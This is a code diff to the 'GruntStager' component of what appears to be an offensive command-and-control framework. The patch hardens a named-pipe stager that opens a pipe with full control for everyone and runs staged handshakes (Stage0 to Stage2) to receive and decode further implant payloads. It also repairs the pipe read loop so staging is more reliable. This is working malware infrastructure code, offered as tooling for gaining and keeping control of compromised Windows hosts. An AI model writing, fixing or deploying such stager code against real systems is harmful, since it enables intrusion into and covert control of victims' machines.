@@ -8,6 +8,8 @@ using System.IO.Pipes;
 using System.IO.Compression;
 using System.Reflection;
 using System.Collections.Generic;
+using System.Security.Principal;
+using System.Security.AccessControl;
 using System.Security.Cryptography;
 
 namespace GruntStager
@@ -57,13 +59,13 @@ namespace GruntStager
                 NamedPipeServerStream pipe = null;
                 string Stage0Response = "";
                 PipeSecurity ps = new PipeSecurity();
-                ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
+                ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                 pipe = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                 pipe.WaitForConnection();
                 System.Threading.Thread.Sleep(5000);
                 var Stage0Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, GUID));
                 Write(pipe, Stage0Bytes);
-                Stage0Response = Encoding.UTF8.GetString(Read(pipe)).Replace("\"", "");
+                Stage0Response = Encoding.UTF8.GetString(Read(pipe));
                 string extracted = Parse(Stage0Response, ProfileReadFormat)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 List<string> parsed = Parse(extracted, MessageFormat);
@@ -94,7 +96,7 @@ namespace GruntStager
                 string Stage1Response = "";
                 var Stage1Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, GUID));
                 Write(pipe, Stage1Bytes);
-                Stage1Response = Encoding.UTF8.GetString(Read(pipe)).Replace("\"", "");
+                Stage1Response = Encoding.UTF8.GetString(Read(pipe));
                 extracted = Parse(Stage1Response, ProfileReadFormat)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 parsed = Parse(extracted, MessageFormat);
@@ -122,7 +124,7 @@ namespace GruntStager
                 string Stage2Response = "";
                 var Stage2Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileWriteFormat, transformedResponse, GUID));
                 Write(pipe, Stage2Bytes);
-                Stage2Response = Encoding.UTF8.GetString(Read(pipe)).Replace("\"", "");
+                Stage2Response = Encoding.UTF8.GetString(Read(pipe));
                 extracted = Parse(Stage2Response, ProfileReadFormat)[0];
                 extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                 parsed = Parse(extracted, MessageFormat);
@@ -161,23 +163,25 @@ namespace GruntStager
         {
             byte[] size = new byte[4];
             int totalReadBytes = 0;
+            int readBytes = 0;
             do
             {
-                totalReadBytes += pipe.Read(size, 0, size.Length);
-            } while (totalReadBytes < size.Length);
+                readBytes = pipe.Read(size, 0, Math.Min(size.Length - totalReadBytes, size.Length));
+                totalReadBytes += readBytes;
+            } while (totalReadBytes < size.Length && readBytes != 0);
             int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];
             
             byte[] buffer = new byte[1024];
             using (var ms = new MemoryStream())
             {
                 totalReadBytes = 0;
-                int readBytes = 0;
+                readBytes = 0;
                 do
                 {
-                    readBytes = pipe.Read(buffer, 0, buffer.Length);
+                    readBytes = pipe.Read(buffer, 0, Math.Min(len - totalReadBytes, buffer.Length));
                     ms.Write(buffer, 0, readBytes);
                     totalReadBytes += readBytes;
-                } while (totalReadBytes < len);
+                } while (totalReadBytes < len && readBytes != 0);
                 return Decompress(ms.ToArray());
             }
         }
